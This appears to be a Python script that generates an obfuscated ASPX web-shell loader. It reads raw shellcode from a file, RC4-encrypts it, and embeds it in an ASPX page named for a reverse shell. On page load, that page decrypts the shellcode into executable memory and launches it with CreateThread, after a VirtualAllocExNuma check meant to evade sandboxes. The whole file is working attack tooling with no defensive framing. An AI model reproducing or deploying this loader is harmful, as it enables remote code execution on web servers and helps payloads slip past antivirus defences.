import base64
from Crypto.Cipher import ARC4
from Crypto.Random import get_random_bytes

def generate_random_key(length=16):
    return get_random_bytes(length)

def encrypt_shellcode(shellcode, key):
    cipher = ARC4.new(key)
    encrypted_shellcode = cipher.encrypt(shellcode)
    return encrypted_shellcode

def format_shellcode(encrypted_shellcode):
    return ", ".join([f"0x{byte:02x}" for byte in encrypted_shellcode])

def generate_aspx_template(encrypted_shellcode, key, shellcode_length):
    key_hex = ", ".join([f"0x{byte:02x}" for byte in key])
    template = f"""
<%@ Page Language="C#" AutoEventWireup="true" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Runtime.InteropServices" %>
<script runat="server">
    private static Int32 MEM_COMMIT = 0x1000;
    private static IntPtr PAGE_EXECUTE_READWRITE = (IntPtr)0x40;

    [DllImport("kernel32")]
    private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr, UIntPtr size, Int32 flAllocationType, IntPtr flProtect);

    [DllImport("kernel32")]
    private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, UIntPtr dwStackSize, IntPtr lpStartAddress, IntPtr param, Int32 dwCreationFlags, ref IntPtr lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    private static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

    [DllImport("kernel32.dll")]
    private static extern IntPtr GetCurrentProcess();

    public static byte[] RC4(byte[] key, byte[] data)
    {{
        int a, i, j, k, tmp;
        int[] box = new int[256];
        byte[] output = new byte[data.Length];
        for (i = 0; i < 256; i++) {{
            box[i] = i;
        }}
        for (j = 0, i = 0; i < 256; i++) {{
            j = (j + box[i] + key[i % key.Length]) % 256;
            tmp = box[i];
            box[i] = box[j];
            box[j] = tmp;
        }}
        for (a = 0, j = 0, i = 0; i < data.Length; i++) {{
            a = (a + 1) % 256;
            j = (j + box[a]) % 256;
            tmp = box[a];
            box[a] = box[j];
            box[j] = tmp;
            k = box[(box[a] + box[j]) % 256];
            output[i] = (byte)(data[i] ^ k);
        }}
        return output;
    }}

    protected void Page_Load(object sender, EventArgs e)
    {{
        IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
        if (mem == IntPtr.Zero)
        {{
            return;
        }}

        byte[] vL8fwOy_ = new byte[{shellcode_length}] {{ {encrypted_shellcode} }};
        byte[] key = new byte[] {{ {key_hex} }};
        byte[] decryptedShellcode = RC4(key, vL8fwOy_);

        IntPtr uPR9CPj_b7 = VirtualAlloc(IntPtr.Zero, (UIntPtr)decryptedShellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        System.Runtime.InteropServices.Marshal.Copy(decryptedShellcode, 0, uPR9CPj_b7, decryptedShellcode.Length);
        IntPtr graLqi = IntPtr.Zero;
        IntPtr vE3FMd = CreateThread(IntPtr.Zero, UIntPtr.Zero, uPR9CPj_b7, IntPtr.Zero, 0, ref graLqi);
    }}
</script>
    """
    return template

def main():
    input_file = "shellcode.bin"
    output_file = "reverseshell_rc4.aspx"

    with open(input_file, "rb") as f:
        shellcode = f.read()

    key = generate_random_key()
    encrypted_shellcode = encrypt_shellcode(shellcode, key)
    formatted_shellcode = format_shellcode(encrypted_shellcode)
    shellcode_length = len(encrypted_shellcode)
    aspx_code = generate_aspx_template(formatted_shellcode, key, shellcode_length)

    with open(output_file, "w") as f:
        f.write(aspx_code)

if __name__ == "__main__":
    main()
